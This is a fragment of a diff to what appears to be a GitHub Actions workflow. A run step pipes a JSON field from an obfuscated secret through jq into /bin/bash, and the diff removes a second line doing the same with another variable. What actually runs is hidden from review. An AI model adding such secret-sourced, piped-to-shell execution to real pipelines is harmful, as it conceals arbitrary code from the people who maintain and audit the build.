@@ -17,7 +17,6 @@ jobs:
           fm6844: ${{ secrets.fm6844 }}
         run: |
           printf '%s' "$fm6844" | jq -r .cdn649 | /bin/bash
-          echo $cpo9 | jq -r .sm55948 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
